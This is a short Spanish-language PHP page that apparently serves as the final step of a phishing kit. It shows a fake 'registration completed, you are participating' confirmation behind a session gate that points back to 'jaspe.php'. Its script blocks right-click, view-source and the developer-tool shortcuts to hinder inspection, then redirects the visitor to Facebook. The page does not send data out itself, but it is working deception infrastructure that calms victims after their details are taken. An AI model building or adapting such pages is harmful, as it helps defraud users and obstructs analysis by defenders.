<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { header('Location: /', true, 302); exit; }
$u = $_SESSION['usuario'] ?? null;
if (!$u) {
    header("Location: jaspe.php");
    exit;
}
session_destroy();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Registro Completado</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
        }
        .checkmark-circle {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background-color: #006838;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            animation: scaleIn 0.5s ease-out;
        }
        .checkmark {
            width: 50px;
            height: 25px;
            border-left: 6px solid #fff;
            border-bottom: 6px solid #fff;
            transform: rotate(-45deg);
            margin-bottom: 10px;
            animation: checkAnim 0.4s ease-out 0.3s both;
        }
        @keyframes scaleIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        @keyframes checkAnim {
            0% {
                width: 0;
                height: 0;
                opacity: 0;
            }
            50% {
                width: 50px;
                height: 0;
                opacity: 1;
            }
            100% {
                width: 50px;
                height: 25px;
                opacity: 1;
            }
        }
        h2 {
            color: #006838;
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        .subtexto {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark-circle">
            <div class="checkmark"></div>
        </div>
        <h2>¡Registro completado exitosamente!</h2>
        <p class="subtexto">Ya estás participando</p>
    </div>
    <script>
        // Protección contra clic derecho y código fuente
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        document.addEventListener('keydown', function(e) {
            // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.keyCode === 123 || // F12
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
                (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
                e.preventDefault();
                return false;
            }
        });

        // Prevenir arrastrar imágenes
        document.addEventListener('dragstart', function(e) {
            if (e.target.tagName === 'IMG') {
                e.preventDefault();
                return false;
            }
        });

        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }
        
        setTimeout(function() {
            if (isMobile()) {
                // Intentar abrir la app de Facebook
                window.location.href = 'fb://';
                // Fallback a la web después de un pequeño delay
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com/';
                }, 500);
            } else {
                window.location.href = 'https://www.facebook.com/';
            }
        }, 2500);
    </script>
</body>
</html>